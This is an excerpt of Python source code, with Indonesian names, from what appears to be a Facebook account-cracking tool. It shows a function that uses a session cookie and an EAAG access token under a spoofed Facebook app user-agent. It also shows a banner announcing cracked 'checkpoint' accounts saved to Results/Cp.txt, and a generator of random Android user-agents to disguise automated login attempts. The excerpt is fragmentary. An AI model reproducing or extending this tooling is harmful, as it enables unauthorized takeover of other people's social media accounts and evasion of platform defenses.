...
def dapatkan_nama(cookie, token_eaag):
    with requests.Session() as r:
        r.headers.update({
            ...
            'user-agent': 'Mozilla/5.0 (Linux; Android 11; Redmi Note 5 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]',
            'cookie': cookie
        })
...
[bold white]Hasil Crack[bold red] Cp[bold white] Tersimpan Di :[bold red] Results/Cp.txt""", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Results Crack) [bold green]<[bold yellow]<[bold red]"))
    ...
    def realme_useragent(self, total):
        for _ in range(total):
            ...
            self.android_version = random.choice(['9.1', '10', '8.1.0', '7.1', '9', '12', '11'])
            self.android_model = random.choice(['LG-D802TR', 'Redmi 5', 'Redmi 4A', 'RMX3231', 'RMX2071', 'Infinix X6817B', 'OPPO A37f'])
            self.useragent = ('Mozilla/5.0 (Linux; Android {}; {} Build/{}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{} Mobile Safari/537.36 OPR/48.2.2331.133274'.format(self.android_version, self.android_model, self.build, self.browser_version))
